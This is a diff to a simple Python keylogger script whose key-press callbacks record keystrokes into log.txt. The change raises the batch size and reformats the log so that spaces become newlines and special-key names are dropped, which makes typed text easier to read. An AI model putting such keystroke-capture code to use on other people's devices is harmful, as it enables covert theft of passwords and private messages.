@@ -16,7 +16,7 @@ def on_press(key):
     except AttributeError:
         print('special key {0} pressed'.format(key))
 
-    if count >= 5:
+    if count >= 10:
         count = 0
         write_file(keys)
         keys = []
@@ -24,7 +24,11 @@ def on_press(key):
 def write_file(keys):
     with open("log.txt", "a") as f:
         for key in keys:
-            f.write(str(key))
+            k = str(key).replace("'", " ")
+            if k.find("space") > 0:
+                f.write('\n')
+            elif k.find("Key") == -1:
+                f.write(k)
 
 def on_release(key): 
     print("{0} released".format(key))
